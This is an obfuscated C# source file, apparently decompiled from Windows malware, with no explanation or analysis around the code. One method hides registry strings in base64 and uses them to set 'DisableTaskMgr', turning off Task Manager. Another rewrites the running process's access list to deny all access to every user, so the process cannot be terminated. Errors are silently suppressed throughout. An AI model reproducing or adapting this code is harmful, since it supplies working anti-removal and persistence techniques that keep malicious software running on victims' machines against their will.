using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace dfbDZtGQEYGzK;

internal class HKXaSVvJYmnnLdA
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr uhEgfImMPVGMFN, int SkDEYsLKmtBVj, [Out] byte[] DzmFhiKFbpm, uint gXxzBAgjOlIf, out uint anuhmYwUvtIZ);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr oxZDlMoVpwxDAvX, int NHEmEadTJcdCR, [In] byte[] MXSDykHaXns);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void wyShdSIjao(bool zTwfKOfmhIzf)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(sWSXzQkxHH.agZtqMkMayfivgE("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"));
			registryKey.SetValue(sWSXzQkxHH.agZtqMkMayfivgE("RGlzYWJsZVRhc2tNZ3I="), "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor RdYAhLXdyl(IntPtr zKCWvbrreTpWxe)
	{
		byte[] dzmFhiKFbpm = new byte[0];
		GetKernelObjectSecurity(zKCWvbrreTpWxe, 4, dzmFhiKFbpm, 0u, out var anuhmYwUvtIZ);
		if ((long)anuhmYwUvtIZ > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(zKCWvbrreTpWxe, 4, dzmFhiKFbpm = new byte[anuhmYwUvtIZ], anuhmYwUvtIZ, out anuhmYwUvtIZ))
		{
			return null;
		}
		return new RawSecurityDescriptor(dzmFhiKFbpm, 0);
	}

	private void fXQJOAFQrde(IntPtr FdsrWchjfYQGy, RawSecurityDescriptor jHFUqFsaePKgCAZ)
	{
		byte[] array = new byte[jHFUqFsaePKgCAZ.BinaryLength];
		jHFUqFsaePKgCAZ.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(FdsrWchjfYQGy, 4, array);
	}

	public void kVVXMvfOFStHR()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = RdYAhLXdyl(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			fXQJOAFQrde(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
